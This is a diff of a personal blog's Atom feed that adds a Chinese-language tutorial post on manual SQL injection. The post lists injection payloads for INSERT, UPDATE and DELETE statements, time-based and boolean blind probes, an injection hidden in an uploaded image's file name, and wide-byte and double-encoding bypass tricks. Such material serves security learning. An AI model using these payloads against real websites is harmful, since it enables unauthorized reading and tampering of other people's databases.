@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://wocao828.github.io/"/>
-  <updated>2019-01-01T14:11:15.859Z</updated>
+  <updated>2019-01-06T07:29:31.488Z</updated>
   <id>https://wocao828.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sql手工注入补充</title>
+    <link href="https://wocao828.github.io/2019/01/06/sql%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E8%A1%A5%E5%85%85/"/>
+    <id>https://wocao828.github.io/2019/01/06/sql手工注入补充/</id>
+    <published>2019-01-06T06:35:16.000Z</published>
+    <updated>2019-01-06T07:29:31.488Z</updated>
+    
+    <content type="html"><![CDATA[<p>前言:上次了解了基础的手工注入，本次继续补充手工注入方法</p><h3 id="insert注入"><a href="#insert注入" class="headerlink" title="insert注入"></a>insert注入</h3><p>sql语句insert into messages (title,message,……) values (‘hello’,’123’,……);</p><p>在insert中输入</p><p>123’) #</p><p>123’,1) #</p><p>123’,1,1) #</p><p>123’,1,1,1) #</p><p>123’,1,1,1…..) #</p><p>猜解注入点及后面的字段</p><p>将显示的地方改为查询语句</p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>sql语句update users set pass = ‘123456’ where name = ‘admin’;</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>123’ and sleep(1) #</p><p>123” and sleep(1) #</p><p>123’) and sleep(1) #</p><p>123”) and sleep(1) #</p><p>应当使用时间盲注123’ where id = 1 and if(length(version())&gt;5,sleep(3),0) #</p><h4 id="上传图片的update注入"><a href="#上传图片的update注入" class="headerlink" title="上传图片的update注入"></a>上传图片的update注入</h4><p>hello’.jpg</p><p>hello’ where sleep(3)#.jpg</p><p>hello’ where id = 1 and sleep(3)#.jpg</p><p>hello’ where id = 1 and if(length(version())&gt;5,sleep(3),0)#.jpg</p><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><p>sql语句delete from users where  id = ‘57’ and name = ‘zs’;</p><p>zs’ and sleep(3)#</p><p>如果不想真的删除一条数据，就可以使用时间延时盲注，注意if语句返回结果都是0</p><p>delete from users where  id = ‘57’ and name = ‘zs’ and if(length(version())&gt;5,sleep(3),0) #’;</p><p>如果数据足够多，就是用布尔盲注</p><p>delete from users where  id = ‘57’ and name = ‘qwerdfzs’ and length(version())&gt;5 #’;</p><h3 id="sql注入预防"><a href="#sql注入预防" class="headerlink" title="sql注入预防"></a>sql注入预防</h3><p>addslashes函数(不能预防数字型注入)</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>编码是gbk编码，utf-8没有宽字节注入</p><p>在注入编码参数加入%df</p><h3 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h3><p>对用户的字符串已经进行了转换</p><p>参数加入%2527</p><h3 id="注入工具"><a href="#注入工具" class="headerlink" title="注入工具"></a>注入工具</h3><p>sqlmap的使用(其他工具的简单使用中介绍)</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;前言:上次了解了基础的手工注入，本次继续补充手工注入方法&lt;/p&gt;
+&lt;h3 id=&quot;insert注入&quot;&gt;&lt;a href=&quot;#insert注入&quot; class=&quot;headerlink&quot; title=&quot;insert注入&quot;&gt;&lt;/a&gt;insert注入&lt;/h3&gt;&lt;p&gt;sql语句inser
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>sql注入之手工注入基础</title>
